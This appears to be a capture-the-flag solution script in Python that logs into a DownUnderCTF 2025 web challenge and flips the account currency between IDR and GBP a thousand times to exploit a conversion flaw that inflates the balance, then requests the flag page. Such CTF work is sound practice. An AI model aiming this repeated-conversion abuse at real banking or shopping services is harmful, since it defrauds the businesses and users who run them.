import requests

url = "https://beginner-stonks-a0c8e158ea33.2025.ductf.net"
session = requests.Session()

# Login (replace with your credentials)
response = session.post(f"{url}/login", data={"username": "thinh", "password": "thinh"})
if "INCORRECT" in response.text:
    print("Login failed")
    exit()

# Alternate between IDR and GBP
currencies = ["IDR", "GBP"]
for i in range(1000):  # Adjust number of iterations
    currency = currencies[i % 2]
    response = session.post(f"{url}/change-currency", data={"currency": currency})
    print(f"Iteration {i+1}: Switched to {currency}")

# Check balance
response = session.get(f"{url}/")
balance = float(response.text.split("Your balance is: ")[1].split(" ")[0])  # Parse balance from HTML
print(f"Final balance: {balance}")

# Check if rich
response = session.get(f"{url}/are-you-rich")
print(response.text)
